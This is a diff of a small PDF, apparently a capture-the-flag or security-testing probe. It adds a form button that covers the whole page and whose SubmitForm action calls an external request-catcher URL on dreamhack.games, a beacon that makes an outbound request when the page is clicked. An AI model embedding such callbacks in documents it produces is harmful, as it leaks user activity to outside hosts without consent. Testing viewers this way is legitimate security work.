@@ -1,31 +1,29 @@
 %PDF-1.7
 1 0 obj
-<< /Type /Catalog /Pages 2 0 R >>
+<< /Type /Catalog /Pages 2 0 R /AcroForm 6 0 R >>
 endobj
+
 2 0 obj
 << /Type /Pages /Kids [3 0 R] /Count 1 >>
 endobj
+
 3 0 obj
 << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [4 0 R] /Resources << >> >>
 endobj
+
 4 0 obj
-<<
-  /Type /Annot
-  /Subtype /Widget
-  /Rect [0 0 612 792]
-  /FT /Btn
-  /Ff 65536
-  /T (SubmitBtn)
-  /F 4
-  /A 5 0 R
->>
+<< /Type /Annot /Subtype /Widget /Rect [0 0 612 792]
+   /FT /Btn /Ff 65536 /T (SubmitBtn) /F 4 /A 5 0 R >>
 endobj
+
 5 0 obj
-<< /Type /Action
-   /S /SubmitForm
-   /F << /Type /FileSpec /F (https://ofqjfdn.request.dreamhack.games/test8.pdf) /V true /FS /URL >>
-   /Flags 4
->>
+<< /Type /Action /S /SubmitForm
+   /F << /Type /FileSpec /F (https://zftevuq.request.dreamhack.games/test8.pdf) /V true /FS /URL >> 
+   /Flags 4 >>
+endobj
+
+6 0 obj
+<< /Fields [4 0 R] >>
 endobj
 xref
 0 6
